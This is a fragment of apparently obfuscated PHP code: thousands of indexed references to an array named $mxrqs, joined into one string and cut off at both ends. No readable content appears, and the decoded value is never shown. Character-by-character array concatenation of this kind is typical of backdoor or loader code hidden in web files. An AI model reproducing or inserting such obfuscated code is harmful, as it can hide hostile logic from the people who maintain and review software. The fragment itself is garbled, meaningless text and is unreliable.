qs[25].$mxrqs[17].$mxrqs[154].$mxrqs[104].$mxrqs[0].$mxrqs[7].$mxrqs[113].$mxrqs[95].$mxrqs[158].$mxrqs[111].$mxrqs[25].$mxrqs[23].$mxrqs[416].$mxrqs[5].$mxrqs[122].$mxrqs[34].$mxrqs[29].$mxrqs[118].$mxrqs[6].$mxrqs[113].$mxrqs[45].$mxrqs[44].$mxrqs[154].$mxrqs[21].$mxrqs[154].$mxrqs[6].$mxrqs[6].$mxrqs[1].$mxrqs[91].$mxrqs[158].$mxrqs[122].$mxrqs[16].$mxrqs[64].$mxrqs[22].$mxrqs[416].$mxrqs[37].$mxrqs[113].$mxrqs[5].$mxrqs[68].$mxrqs[111].$mxrqs[44].$mxrqs[111].$mxrqs[20].$mxrqs[416].$mxrqs[91].$mxrqs[194].$mxrqs[48].$mxrqs[39].$mxrqs[5].$mxrqs[7].$mxrqs[43].$mxrqs[231].$mxrqs[154].$mxrqs[164].$mxrqs[27].$mxrqs[43].$mxrqs[111].$mxrqs[164].$mxrqs[29].$mxrqs[15].$mxrqs[10].$mxrqs[9].$mxrqs[274].$mxrqs[43].$mxrqs[17].$mxrqs[100].$mxrqs[4].$mxrqs[18].$mxrqs[194].$mxrqs[33].$mxrqs[73].$mxrqs[21].$mxrqs[4].$mxrqs[36].$mxrqs[73].$mxrqs[231].$mxrqs[33].$mxrqs[13].$mxrqs[22].$mxrqs[63].$mxrqs[111].$mxrqs[14].$mxrqs[91].$mxrqs[12].$mxrqs[6].$mxrqs[45].$mxrqs[4].$mxrqs[21].$mxrqs[23].$mxrqs[8].$mxrqs[8].$mxrqs[22].$mxrqs[158].$mxrqs[275].$mxrqs[27].$mxrqs[56].$mxrqs[52].$mxrqs[12].$mxrqs[113].$mxrqs[34].$mxrqs[13].$mxrqs[0].$mxrqs[44].$mxrqs[416].$mxrqs[9].$mxrqs[184].$mxrqs[22].$mxrqs[4].$mxrqs[416].$mxrqs[12].$mxrqs[10].$mxrqs[21].$mxrqs[73].$mxrqs[14].$mxrqs[39].$mxrqs[33].$mxrqs[25].$mxrqs[88].$mxrqs[21].$mxrqs[10].$mxrqs[34].$mxrqs[68].$mxrqs[0].$mxrqs[12].$mxrqs[29].$mxrqs[52].$mxrqs[88].$mxrqs[231].$mxrqs[73].$mxrqs[73].$mxrqs[63].$mxrqs[23].$mxrqs[184].$mxrqs[1].$mxrqs[13].$mxrqs[25].$mxrqs[4].$mxrqs[95].$mxrqs[68].$mxrqs[5].$mxrqs[29].$mxrqs[95].$mxrqs[39].$mxrqs[6].$mxrqs[164].$mxrqs[118].$mxrqs[6].$mxrqs[14].$mxrqs[69].$mxrqs[39].$mxrqs[194].$mxrqs[416].$mxrqs[91].$mxrqs[184].$mxrqs[231].$mxrqs[22].$mxrqs[9].$mxrqs[66].$mxrqs[22].$mxrqs[91].$mxrqs[0].$mxrqs[52].$mxrqs[122].$mxrqs[68].$mxrqs[73].$mxrqs[33].$mxrqs[36].$mxrqs[16].$mxrqs[100].$mxrqs[275].$mxrqs[5].$mxrqs[52].$mxrqs[10].$mxrqs[6].$mxrqs[69].$mxrqs[13].$mxrqs[122].$mxrqs[2].$mxrqs[13].$mxrqs[45].$mxrqs[154].$mxrqs[15].$mxrqs[37].$mxrqs[16].$mxrqs[16].$mxrqs[194].$mxrqs[4].$mxrqs[111].$mxrqs[3].$mxrqs[16].$mxrqs[2].$mxrqs[184].$mxrqs[52].$mxrqs[14].$mxrqs[33].$mxrqs[59].$mxrqs[47].$mxrqs[4].$mxrqs[4].$mxrqs[8].$mxrqs[23].$mxrqs[36].$mxrqs[44].$mxrqs[64].$mxrqs[184].$mxrqs[45].$mxrqs[104].$mxrqs[47].$mxrqs[91].$mxrqs[39].$mxrqs[95].$mxrqs[25].$mxrqs[184].$mxrqs[34].$mxrqs[59].$mxrqs[37].$mxrqs[68].$mxrqs[37].$mxrqs[18].$mxrqs[27].$mxrqs[44].$mxrqs[109].$mxrqs[154].$mxrqs[23].$mxrqs[88].$mxrqs[39].$mxrqs[0].$mxrqs[69].$mxrqs[23].$mxrqs[164].$mxrqs[63].$mxrqs[13].$mxrqs[194].$mxrqs[95].$mxrqs[95].$mxrqs[0].$mxrqs[4].$mxrqs[36].$mxrqs[56].$mxrqs[73].$mxrqs[88].$mxrqs[95].$mxrqs[69].$mxrqs[34].$mxrqs[122].$mxrqs[27].$mxrqs[95].$mxrqs[22].$mxrqs[59].$mxrqs[8].$mxrqs[13].$mxrqs[9].$mxrqs[29].$mxrqs[122].$mxrqs[6].$mxrqs[8].$mxrqs[33].$mxrqs[127].$mxrqs[34].$mxrqs[64].$mxrqs[39].$mxrqs[8].$mxrqs[20].$mxrqs[16].$mxrqs[13].$mxrqs[17].$mxrqs[194].$mxrqs[47].$mxrqs[45].$mxrqs[122].$mxrqs[48].$mxrqs[66].$mxrqs[20].$mxrqs[9].$mxrqs[127].$mxrqs[29].$mxrqs[56].$mxrqs[44].$mxrqs[33].$mxrqs[25].$mxrqs[274].$mxrqs[95].$mxrqs[194].$mxrqs[43].$mxrqs[52].$mxrqs[127].$mxrqs[164].$mxrqs[63].$mxrqs[184].$mxrqs[34].$mxrqs[48].$mxrqs[154].$mxrqs[48].$mxrqs[39].$mxrqs[17].$mxrqs[69].$mxrqs[33].$mxrqs[3].$mxrqs[231].$mxrqs[15].$mxrqs[27].$mxrqs[48].$mxrqs[25].$mxrqs[1].$mxrqs[48].$mxrqs[275].$mxrqs[43].$mxrqs[45].$mxrqs[13].$mxrqs[91].$mxrqs[45].$mxrqs[29].$mxrqs[0].$mxrqs[64].$mxrqs[25].$mxrqs[34].$mxrqs[91].$mxrqs[52].$mxrqs[88].$mxrqs[59].$mxrqs[12].$mxrqs[23].$mxrqs[25].$mxrqs[95].$mxrqs[0].$mxrqs[95].$mxrqs[21].$mxrqs[0].$mxrqs[44].$mxrqs[59].$mxrqs[91].$mxrqs[274].$mxrqs[184].$mxrqs[14].$mxrqs[275].$mxrqs[56].$mxrqs[13].$mxrqs[47].$mxrqs[48].$mxrqs[109].$mxrqs[13].$mxrqs[34].$mxrqs[104].$mxrqs[231].$mxrqs[56].$mxrqs[20].$mxrqs[20].$mxrqs[29].$mxrqs[194].$mxrqs[7].$mxrqs[95].$mxrqs[25].$mxrqs[37].$mxrqs[109].$mxrqs[91].$mxrqs[12].$mxrqs[25].$mxrqs[14].$mxrqs[14].$mxrqs[48].$mxrqs[113].$mxrqs[14].$mxrqs[21].$mxrqs[25].$mxrqs[63].$mxrqs[20].$mxrqs[95].$mxrqs[154].$mxrqs[4].$mxrqs[1].$mxrqs[22].$mxrqs[164].$mxrqs[66].$mxrqs[113].$mxrqs[104].$mxrqs[158].$mxrqs[59].$mxrqs[100].$mxrqs[109].$mxrqs[17].$mxrqs[47].$mxrqs[66].$mxrqs[184].$mxrqs[4].$mxrqs[52].$mxrqs[47].$mxrqs[6].$mxrqs[20].$mxrqs[154].$mxrqs[73].$mxrqs[275].$mxrqs[95].$mxrqs[8].$mxrqs[27].$mxrqs[20].$mxrqs[16].$mxrqs[37].$mxrqs[0].$mxrqs[104].$mxrqs[33].$mxrqs[16].$mxrqs[5].$mxrqs[122].$mxrqs[36].$mxrqs[17].$mxrqs[118].$mxrqs[33].$mxrqs[91].$mxrqs[5].$mxrqs[22].$mxrqs[68].$mxrqs[52].$mxrqs[68].$mxrqs[43].$mxrqs[64].$mxrqs[33].$mxrqs[95].$mxrqs[73].$mxrqs[5].$mxrqs[47].$mxrqs[2].$mxrqs[5].$mxrqs[0].$mxrqs[66].$mxrqs[48].$mxrqs[0].$mxrqs[95].$mxrqs[194].$mxrqs[88].$mxrqs[16].$mxrqs[52].$mxrqs[122].$mxrqs[73].$mxrqs[59].$mxrqs[44].$mxrqs[23].$mxrqs[231].$mxrqs[39].$mxrqs[73].$mxrqs[13].$mxrqs[275].$mxrqs[1].$mxrqs[7].$mxrqs[416].$mxrqs[194].$mxrqs[18].$mxrqs[14].$mxrqs[13].$mxrqs[63].$mxrqs[27].$mxrqs[0].$mxrqs[64].$mxrqs[95].$mxrqs[91].$mxrqs[91].$mxrqs[73].$mxrqs[10].$mxrqs[56].$mxrqs[158].$mxrqs[4].$mxrqs[416].$mxrqs[15].$mxrqs[39].$mxrqs[158].$mxrqs[59].$mxrqs[15].$mxrqs[118].$mxrqs[47].$mxrqs[29].$mxrqs[88].$mxrqs[158].$mxrqs[22].$mxrqs[33].$mxrqs[17].$mxrqs[44].$mxrqs[4].$mxrqs[66].$mxrqs[43].$mxrqs[16].$mxrqs[66].$mxrqs[45].$mxrqs[3].$mxrqs[0].$mxrqs[44].$mxrqs[7].$mxrqs[36].$mxrqs[13].$mxrqs[10].$mxrqs[104].$mxrqs[7].$mxrqs[194].$mxrqs[66].$mxrqs[44].$mxrqs[66].$mxrqs[113].$mxrqs[17].$mxrqs[59].$mxrqs[6].$mxrqs[95].$mxrqs[18].$mxrqs[100].$mxrqs[158].$mxrqs[16].$mxrqs[20].$mxrqs[154].$mxrqs[154].$mxrqs[122].$mxrqs[5].$mxrqs[109].$mxrqs[184].$mxrqs[27].$mxrqs[2].$mxrqs[37].$mxrqs[6].$mxrqs[48].$mxrqs[9].$mxrqs[16].$mxrqs[104].$mxrqs[63].$mxrqs[20].$mxrqs[14].$mxrqs[6].$mxrqs[23].$mxrqs[9].$mxrqs[63].$mxrqs[6].$mxrqs[64].$mxrqs[1].$mxrqs[22].$mxrqs[52].$mxrqs[95].$mxrqs[275].$mxrqs[274].$mxrqs[39].$mxrqs[6].$mxrqs[127].$mxrqs[231].$mxrqs[27].$mxrqs[9].$mxrqs[113].$mxrqs[33].$mxrqs[104].$mxrqs[63].$mxrqs[113].$mxrqs[33].$mxrqs[111].$mxrqs[127].$mxrqs[47].$mxrqs[18].$mxrqs[104].$mxrqs[2].$mxrqs[20].$mxrqs[68].$mxrqs[64].$mxrqs[13].$mxrqs[48].$mxrqs[64].$mxrqs[52].$mxrqs[7].$mxrqs[4].$mxrqs[184].$mxrqs[2].$mxrqs[21].$mxrqs[9].$mxrqs[2].$mxrqs[5].$mxrqs[2].$mxrqs[56].$mxrqs[113].$mxrqs[20].$mxrqs[100].$mxrqs[14].$mxrqs[69].$mxrqs[10].$mxrqs[34].$mxrqs[44].$mxrqs[113].$mxrqs[3].$mxrqs[48].$mxrqs[33].$mxrqs[9].$mxrqs[8].$mxrqs[7].$mxrqs[73].$mxrqs[5].$mxrqs[52].$mxrqs[95].$mxrqs[111].$mxrqs[21].$mxrqs[63].$mxrqs[13].$mxrqs[73].$mxrqs[20].$mxrqs[64].$mxrqs[37].$mxrqs[69].$mxrqs[23].$mxrqs[44].$mxrqs[29].$mxrqs[33].$mxrqs[4].$mxrqs[274].$mxrqs[17].$mxrqs[5].$mxrqs[20].$mxrqs[34].$mxrqs[18].$mxrqs[22].$mxrqs[25].$mxrqs[56].$mxrqs[0].$mxrqs[164].$mxrqs[5].$mxrqs[43].$mxrqs[23].$mxrqs[274].$mxrqs[13].$mxrqs[8].$mxrqs[104].$mxrqs[5].$mxrqs[27].$mxrqs[15].$mxrqs[43].$mxrqs[6].$mxrqs[68].$mxrqs[13].$mxrqs[66].$mxrqs[109].$mxrqs[113].$mxrqs[17].$mxrqs[127].$mxrqs[109].$mxrqs[111].$mxrqs[1].$mxrqs[13].$mxrqs[6].$mxrqs[5].$mxrqs[15].$mxrqs[43].$mxrqs[113].$mxrqs[95].$mxrqs[47].$mxrqs[52].$mxrqs[44].$mxrqs[3].$mxrqs[22].$mxrqs[17].$mxrqs[8].$mxrqs[9].$mxrqs[184].$mxrqs[34].$mxrqs[20].$mxrqs[194].$mxrqs[5].$mxrqs[10].$mxrqs[109].$mxrqs[45].$mxrqs[44].$mxrqs[111].$mxrqs[48].$mxrqs[52].$mxrqs[36].$mxrqs[1].$mxrqs[39].$mxrqs[275].$mxrqs[25].$mxrqs[10].$mxrqs[37].$mxrqs[0].$mxrqs[100].$mxrqs[416].$mxrqs[33].$mxrqs[231].$mxrqs[5].$mxrqs[9].$mxrqs[66].$mxrqs[10].$mxrqs[0].$mxrqs[8].$mxrqs[91].$mxrqs[100].$mxrqs[29].$mxrqs[113].$mxrqs[68].$mxrqs[111].$mxrqs[33].$mxrqs[122].$mxrqs[194].$mxrqs[34].$mxrqs[158].$mxrqs[113].$mxrqs[154].$mxrqs[1].$mxrqs[16].$mxrqs[275].$mxrqs[63].$mxrqs[158].$mxrqs[12].$mxrqs[23].$mxrqs[2].$mxrqs[37].$mxrqs[10].$mxrqs[27].$mxrqs[122].$mxrqs[113].$mxrqs[274].$mxrqs[21].$mxrqs[43].$mxrqs[154].$mxrqs[25].$mxrqs[127].$mxrqs[6].$mxrqs[17].$mxrqs[39].$mxrqs[52].$mxrqs[52].$mxrqs[0].$mxrqs[5].$mxrqs[122].$mxrqs[8].$mxrqs[34].$mxrqs[274].$mxrqs[194].$mxrqs[88].$mxrqs[34].$mxrqs[21].$mxrqs[275].$mxrqs[275].$mxrqs[48].$mxrqs[0].$mxrqs[3].$mxrqs[127].$mxrqs[64].$mxrqs[91].$mxrqs[59].$mxrqs[111].$mxrqs[39].$mxrqs[12].$mxrqs[194].$mxrqs[52].$mxrqs[39].$mxrqs[15].$mxrqs[44].$mxrqs[29].$mxrqs[37].$mxrqs[12].$mxrqs[0].$mxrqs[48].$mxrqs[184].$mxrqs[56].$mxrqs[164].$mxrqs[127].$mxrqs[17].$mxrqs[0].$mxrqs[5].$mxrqs[27].$mxrqs[39].$mxrqs[52].$mxrqs[63].$mxrqs[29].$mxrqs[34].$mxrqs[23].$mxrqs[34].$mxrqs[274].$mxrqs[3].$mxrqs[33].$mxrqs[56].$mxrqs[194].$mxrqs[88].$mxrqs[416].$mxrqs[18].$mxrqs[8].$mxrqs[37].$mxrqs[88].$mxrqs[109].$mxrqs[88].$mxrqs[17].$mxrqs[13].$mxrqs[118].$mxrqs[64].$mxrqs[34].$mxrqs[1].$mxrqs[63].$mxrqs[25].$mxrqs[5].$mxrqs[22].$mxrqs[56].$mxrqs[13].$mxrqs[16].$mxrqs[14].$mxrqs[1].$mxrqs[231].$mxrqs[33].$mxrqs[13].$mxrqs[23].$mxrqs[231].$mxrqs[91].$mxrqs[122].$mxrqs[4].$mxrqs[14].$mxrqs[5].$mxrqs[44].$mxrqs[2].$mxrqs[127].$mxrqs[15].$mxrqs[194].$mxrqs[59].$mxrqs[45].$mxrqs[118].$mxrqs[25].$mxrqs[100].$mxrqs[14].$mxrqs[127].$mxrqs[45].$mxrqs[2].$mxrqs[111].$mxrqs[4].$mxrqs[44].$mxrqs[17].$mxrqs[52].$mxrqs[194].$mxrqs[43].$mxrqs[109].$mxrqs[36].$mxrqs[158].$mxrqs[47].$mxrqs[47].$mxrqs[25].$mxrqs[37].$mxrqs[13].$mxrqs[33].$mxrqs[3].$mxrqs[48].$mxrqs[13].$mxrqs[22].$mxrqs[34].$mxrqs[64].$mxrqs[25].$mxrqs[3].$mxrqs[34].$mxrqs[9].$mxrqs[22].$mxrqs[164].$mxrqs[59].$mxrqs[104].$mxrqs[416].$mxrqs[17].$mxrqs[154].$mxrqs[52].$mxrqs[43].$mxrqs[29].$mxrqs[64].$mxrqs[39].$mxrqs[17].$mxrqs[231].$mxrqs[7].$mxrqs[39].$mxrqs[113].$mxrqs[13].$mxrqs[91].$mxrqs[63].$mxrqs[127].$mxrqs[34].$mxrqs[122].$mxrqs[59].$mxrqs[10].$mxrqs[6].$mxrqs[15].$mxrqs[7].$mxrqs[274].$mxrqs[36].$mxrqs[12].$mxrqs[73].$mxrqs[66].$mxrqs[36].$mxrqs[95].$mxrqs[64].$mxrqs[45].$mxrqs[111].$mxrqs[194].$mxrqs[6].$mxrqs[118].$mxrqs[64].$mxrqs[59].$mxrqs[56].$mxrqs[23].$mxrqs[22].$mxrqs[109].$mxrqs[25].$mxrqs[109].$mxrqs[100].$mxrqs[43].$mxrqs[52].$mxrqs[127].$mxrqs[0].$mxrqs[56].$mxrqs[14].$mxrqs[34].$mxrqs[164].$mxrqs[100].$mxrqs[0].$mxrqs[10].$mxrqs[25].$mxrqs[17].$mxrqs[29].$mxrqs[27].$mxrqs[1].$mxrqs[3].$mxrqs[95].$mxrqs[17].$mxrqs[184].$mxrqs[184].$mxrqs[416].$mxrqs[29].$mxrqs[231].$mxrqs[122].$mxrqs[104].$mxrqs[36].$mxrqs[22].$mxrqs[18].$mxrqs[7].$mxrqs[13].$mxrqs[164].$mxrqs[66].$mxrqs[6].$mxrqs[18].$mxrqs[59].$mxrqs[23].$mxrqs[17].$mxrqs[416].$mxrqs[56].$mxrqs[109].$mxrqs[275].$mxrqs[69].$mxrqs[36].$mxrqs[20].$mxrqs[25].$mxrqs[194].$mxrqs[18].$mxrqs[21].$mxrqs[36].$mxrqs[13].$mxrqs[43].$mxrqs[88].$mxrqs[68].$mxrqs[7].$mxrqs[43].$mxrqs[43].$mxrqs[9].$mxrqs[25].$mxrqs[104].$mxrqs[91].$mxrqs[127].$mxrqs[109].$mxrqs[122].$mxrqs[25].$mxrqs[15].$mxrqs[48].$mxrqs[27].$mxrqs[39].$mxrqs[23].$mxrqs[8].$mxrqs[29].$mxrqs[22].$mxrqs[416].$mxrqs[16].$mxrqs[34].$mxrqs[29].$mxrqs[44].$mxrqs[184].$mxrqs[63].$mxrqs[21].$mxrqs[15].$mxrqs[111].$mxrqs[29].$mxrqs[17].$mxrqs[88].$mxrqs[164].$mxrqs[18].$mxrqs[154].$mxrqs[64].$mxrqs[17].$mxrqs[66].$mxrqs[63].$mxrqs[8].$mxrqs[1].$mxrqs[37].$mxrqs[16].$mxrqs[36].$mxrqs[95].$mxrqs[33].$mxrqs[47].$mxrqs[16].$mxrqs[63].$mxrqs[73].$mxrqs[44].$mxrqs[95].$mxrqs[100].$mxrqs[9].$mxrqs[68].$mxrqs[73].$mxrqs[64].$mxrqs[39].$mxrqs[274].$mxrqs[5].$mxrqs[16].$mxrqs[45].$mxrqs[127].$mxrqs[23].$mxrqs[22].$mxrqs[23].$mxrqs[9].$mxrqs[127].$mxrqs[64].$mxrqs[44].$mxrqs[113].$mxrqs[59].$mxrqs[33].$mxrqs[29].$mxrqs[12].$mxrqs[109].$mxrqs[73].$mxrqs[91].$mxrqs[231].$mxrqs[4].$mxrqs[4].$mxrqs[7].$mxrqs[8].$mxrqs[37].$mxrqs[184].$mxrqs[3].$mxrqs[22].$mxrqs[5].$mxrqs[29].$mxrqs[231].$mxrqs[15].$mxrqs[7].$mxrqs[36].$mxrqs[39].$mxrqs[20].$mxrqs[36].$mxrqs[194].$mxrqs[14].$mxrqs[95].$mxrqs[39].$mxrqs[0].$mxrqs[25].$mxrqs[10].$mxrqs[15].$mxrqs[20].$mxrqs[16].$mxrqs[17].$mxrqs[29].$mxrqs[2].$mxrqs[14].$mxrqs[68].$mxrqs[52].$mxrqs[36].$mxrqs[43].$mxrqs[104].$mxrqs[29].$mxrqs[48].$mxrqs[69].$mxrqs[34].$mxrqs[23].$mxrqs[37].$mxrqs[91].$mxrqs[45].$mxrqs[36].$mxrqs[6].$mxrqs[66].$mxrqs[21].$mxrqs[52].$mxrqs[68].$mxrqs[39].$mxrqs[111].$mxrqs[8].$mxrqs[5].$mxrqs[4].$mxrqs[8].$mxrqs[10].$mxrqs[158].$mxrqs[416].$mxrqs[33].$mxrqs[43].$mxrqs[194].$mxrqs[0].$mxrqs[10].$mxrqs[59].$mxrqs[100].$mxrqs[4].$mxrqs[33].$mxrqs[275].$mxrqs[37].$mxrqs[13].$mxrqs[34].$mxrqs[69].$mxrqs[15].$mxrqs[17].$mxrqs[37].$mxrqs[48].$mxrqs[95].$mxrqs[127].$mxrqs[16].$mxrqs[154].$mxrqs[22].$mxrqs[8].$mxrqs[2].$mxrqs[10].$mxrqs[95].$mxrqs[36].$mxrqs[39].$mxrqs[194].$mxrqs[69].$mxrqs[12].$mxrqs[39].$mxrqs[5].$mxrqs[91].$mxrqs[95].$mxrqs[91].$mxrqs[36].$mxrqs[47].$mxrqs[8].$mxrqs[231].$mxrqs[39].$mxrqs[12].$mxrqs[52].$mxrqs[34].$mxrqs[36].$mxrqs[21].$mxrqs[113].$mxrqs[59].$mxrqs[8].$mxrqs[69].$mxrqs[63].$mxrqs[111].$mxrqs[23].$mxrqs[5].$mxrqs[88].$mxrqs[104].$mxrqs[4].$mxrqs[17].$mxrqs[25].$mxrqs[118].$mxrqs[154].$mxrqs[274].$mxrqs[100].$mxrqs[14].$mxrqs[113].$mxrqs[104].$mxrqs[20].$mxrqs[39].$mxrqs[36].$mxrqs[416].$mxrqs[7].$mxrqs[3].$mxrqs[33].$mxrqs[158].$mxrqs[3].$mxrqs[274].$mxrqs[91].$mxrqs[48].$mxrqs[12].$mxrqs[14].$mxrqs[5].$mxrqs[44].$mxrqs[6].$mxrqs[127].$mxrqs[4].$mxrqs[9].$mxrqs[37].$mxrqs[34].$mxrqs[100].$mxrqs[91].$mxrqs[158].$mxrqs[18].$mxrqs[95].$mxrqs[68].$mxrqs[91].$mxrqs[113].$mxrqs[88].$mxrqs[13].$mxrqs[48].$mxrqs[416].$mxrqs[16].$mxrqs[274].$mxrqs[154].$mxrqs[52].$mxrqs[44].$mxrqs[34].$mxrqs[23].$mxrqs[2].$mxrqs[63].$mxrqs[10].$mxrqs[2].$mxrqs[2].$mxrqs[194].$mxrqs[100].$mxrqs[16].$mxrqs[122].$mxrqs[184].$mxrqs[21].$mxrqs[274].$mxrqs[274].$mxrqs[164].$mxrqs[0].$mxrqs[44].$mxrqs[56].$mxrqs[20].$mxrqs[7].$mxrqs[36].$mxrqs[48].$mxrqs[6].$mxrqs[43].$mxrqs[275].$mxrqs[17].$mxrqs[39].$mxrqs[118].$mxrqs[13].$mxrqs[25].$mxrqs[18].$mxrqs[29].$mxrqs[59].$mxrqs[7].$mxrqs[118].$mxrqs[66].$mxrqs[18].$mxrqs[1].$mxrqs[69].$mxrqs[66].$mxrqs[21].$mxrqs[59].$mxrqs[48].$mxrqs[154].$mxrqs[56].$mxrqs[16].$mxrqs[21].$mxrqs[118].$mxrqs[44].$mxrqs[12].$mxrqs[33].$mxrqs[2].$mxrqs[63].$mxrqs[8].$mxrqs[37].$mxrqs[64].$mxrqs[154].$mxrqs[113].$mxrqs[14].$mxrqs[111].$mxrqs[45].$mxrqs[111].$mxrqs[14].$mxrqs[20].$mxrqs[1].$mxrqs[104].$mxrqs[164].$mxrqs[6].$mxrqs[91].$mxrqs[45].$mxrqs[4].$mxrqs[48].$mxrqs[154].$mxrqs[6].$mxrqs[48].$mxrqs[95].$mxrqs[47].$mxrqs[0].$mxrqs[13].$mxrqs[18].$mxrqs[48].$mxrqs[127].$mxrqs[43].$mxrqs[17].$mxrqs[416].$mxrqs[8].$mxrqs[7].$mxrqs[43].$mxrqs[69].$mxrqs[21].$mxrqs[18].$mxrqs[73].$mxrqs[17].$mxrqs[23].$mxrqs[16].$mxrqs[88].$mxrqs[39].$mxrqs[7].$mxrqs[184].$mxrqs[154].$mxrqs[64].$mxrqs[25].$mxrqs[9].$mxrqs[95].$mxrqs[45].$mxrqs[13].$mxrqs[14].$mxrqs[45].$mxrqs[18].$mxrqs[47].$mxrqs[27].$mxrqs[52].$mxrqs[194].$mxrqs[29].$mxrqs[6].$mxrqs[36].$mxrqs[6].$mxrqs[69].$mxrqs[36].$mxrqs[164].$mxrqs[184].$mxrqs[154].$mxrqs[63].$mxrqs[17].$mxrqs[66].$mxrqs[127].$mxrqs[16].$mxrqs[274].$mxrqs[43].$mxrqs[127].$mxrqs[36].$mxrqs[17].$mxrqs[91].$mxrqs[63].$mxrqs[5].$mxrqs[95].$mxrqs[64].$mxrqs[29].$mxrqs[43].$mxrqs[17].$mxrqs[100].$mxrqs[118].$mxrqs[43].$mxrqs[29].$mxrqs[66].$mxrqs[91].$mxrqs[164].$mxrqs[158].$mxrqs[122].$mxrqs[109].$mxrqs[109].$mxrqs[45].$mxrqs[29].$mxrqs[16].$mxrqs[118].$mxrqs[164].$mxrqs[95].$mxrqs[9].$mxrqs[111].$mxrqs[43].$mxrqs[20].$mxrqs[122].$mxrqs[39].$mxrqs[118].$mxrqs[37].$mxrqs[36].$mxrqs[14].$mxrqs[33].$mxrqs[194].$mxrqs[16].$mxrqs[52].$mxrqs[68].$mxrqs[20].$mxrqs[127].$mxrqs[6].$mxrqs[91].$mxrqs[164].$mxrqs[21].$mxrqs[64].$mxrqs[274].$mxrqs[20].$mxrqs[69].$mxrqs[10].$mxrqs[91].$mxrqs[15].$mxrqs[158].$mxrqs[34].$mxrqs[63].$mxrqs[52].$mxrqs[0].$mxrqs[91].$mxrqs[91].$mxrqs[4].$mxrqs[2].$mxrqs[33].$mxrqs[154].$mxrqs[12].$mxrqs[7].$mxrqs[127].$mxrqs[25].$mxrqs[109].$mxrqs[63].$mxrqs[17].$mxrqs[59].$mxrqs[7].$mxrqs[184].$mxrqs[9].$mxrqs[127].$mxrqs[12].$mxrqs[21].$mxrqs[194].$mxrqs[4].$mxrqs[91].$mxrqs[37].$mxrqs[16].$mxrqs[23].$mxrqs[231].$mxrqs[20].$mxrqs[59].$mxrqs[122].$mxrqs[416].$mxrqs[27].$mxrqs[66].$mxrqs[45].$mxrqs[127].$mxrqs[1].$mxrqs[8].$mxrqs[64].$mxrqs[29].$mxrqs[16].$mxrqs[14].$mxrqs[7].$mxrqs[154].$mxrqs[64].$mxrqs[15].$mxrqs[118].$mxrqs[29].$mxrqs[127].$mxrqs[48].$mxrqs[2].$mxrqs[231].$mxrqs[1].$mxrqs[100].$mxrqs[45].$mxrqs[39].$mxrqs[104].$mxrqs[109].$mxrqs[34].$mxrqs[91].$mxrqs[69].$mxrqs[45].$mxrqs[12].$mxrqs[158].$mxrqs[275].$mxrqs[194].$mxrqs[88].$mxrqs[8].$mxrqs[7].$mxrqs[18].$mxrqs[12].$mxrqs[7].$mxrqs[7].$mxrqs[113].$mxrqs[45].$mxrqs[127].$mxrqs[64].$mxrqs[52].$mxrqs[48].$mxrqs[109].$mxrqs[274].$mxrqs[69].$mxrqs[14].$mxrqs[9].$mxrqs[91].$mxrqs[15].$mxrqs[37].$mxrqs[111].$mxrqs[88].$mxrqs[113].$mxrqs[25].$mxrqs[118].$mxrqs[44].$mxrqs[100].$mxrqs[231].$mxrqs[10].$mxrqs[231].$mxrqs[39].$mxrqs[4].$mxrqs[91].$mxrqs[17].$mxrqs[22].$mxrqs[22].$mxrqs[91].$mxrqs[64].$mxrqs[34].$mxrqs[68].$mxrqs[56].$mxrqs[184].$mxrqs[56].$mxrqs[29].$mxrqs[4].$mxrqs[29].$mxrqs[158].$mxrqs[27].$mxrqs[17].$mxrqs[64].$mxrqs[33].$mxrqs[45].$mxrqs[25].$mxrqs[231].$mxrqs[43].$mxrqs[6].$mxrqs[36].$mxrqs[194].$mxrqs[68].$mxrqs[100].$mxrqs[47].$mxrqs[100].$mxrqs[59].$mxrqs[15].$mxrqs[33].$mxrqs[109].$mxrqs[9].$mxrqs[20].$mxrqs[127].$mxrqs[13].$mxrqs[13].$mxrqs[95].$mxrqs[44].$mxrqs[104].$mxrqs[45].$mxrqs[27].$mxrqs[6].$mxrqs[2].$mxrqs[25].$mxrqs[2].$mxrqs[45].$mxrqs[63].$mxrqs[64].$mxrqs[21].$mxrqs[25].$mxrqs[45].$mxrqs[95].$mxrqs[95].$mxrqs[43].$mxrqs[88].$mxrqs[88].$mxrqs[36].$mxrqs[0].$mxrqs[56].$mxrqs[29].$mxrqs[47].$mxrqs[184].$mxrqs[95].$mxrqs[52].$mxrqs[37].$mxrqs[10].$mxrqs[66].$mxrqs[275].$mxrqs[274].$mxrqs[68].$mxrqs[68].$mxrqs[231].$mxrqs[34].$mxrqs[5].$mxrqs[0].$mxrqs[91].$mxrqs[194].$mxrqs[68].$mxrqs[184].$mxrqs[3].$mxrqs[8].$mxrqs[164].$mxrqs[43].$mxrqs[68].$mxrqs[36].$mxrqs[13].$mxrqs[104].$mxrqs[91].$mxrqs[37].$mxrqs[36].$mxrqs[231].$mxrqs[20].$mxrqs[104].$mxrqs[13].$mxrqs[59].$mxrqs[113].$mxrqs[15].$mxrqs[154].$mxrqs[10].$mxrqs[0].$mxrqs[95].$mxrqs[111].$mxrqs[8].$mxrqs[9].$mxrqs[95].$mxrqs[56].$mxrqs[44].$mxrqs[194].$mxrqs[63].$mxrqs[184].$mxrqs[21].$mxrqs[5].$mxrqs[29].$mxrqs[109].$mxrqs[6].$mxrqs[37].$mxrqs[69].$mxrqs[44].$mxrqs[164].$mxrqs[91].$mxrqs[23].$mxrqs[0].$mxrqs[20].$mxrqs[13].$mxrqs[154].$mxrqs[3].$mxrqs[111].$mxrqs[66].$mxrqs[13].$mxrqs[2].$mxrqs[118].$mxrqs[275].$mxrqs[8].$mxrqs[33].$mxrqs[104].$mxrqs[13].$mxrqs[6].$mxrqs[231].$mxrqs[43].$mxrqs[44].$mxrqs[29].$mxrqs[4].$mxrqs[127].$mxrqs[48].$mxrqs[63].$mxrqs[122].$mxrqs[23].$mxrqs[48].$mxrqs[23].$mxrqs[15].$mxrqs[1].$mxrqs[23].$mxrqs[6].$mxrqs[20].$mxrqs[14].$mxrqs[3].$mxrqs[15].$mxrqs[44].$mxrqs[15].$mxrqs[17].$mxrqs[33].$mxrqs[56].$mxrqs[14].$mxrqs[12].$mxrqs[274].$mxrqs[118].$mxrqs[66].$mxrqs[109].$mxrqs[16].$mxrqs[127].$mxrqs[15].$mxrqs[18].$mxrqs[10].$mxrqs[52].$mxrqs[8].$mxrqs[45].$mxrqs[9].$mxrqs[100].$mxrqs[20].$mxrqs[15].$mxrqs[95].$mxrqs[16].$mxrqs[16].$mxrqs[13].$mxrqs[66].$mxrqs[104].$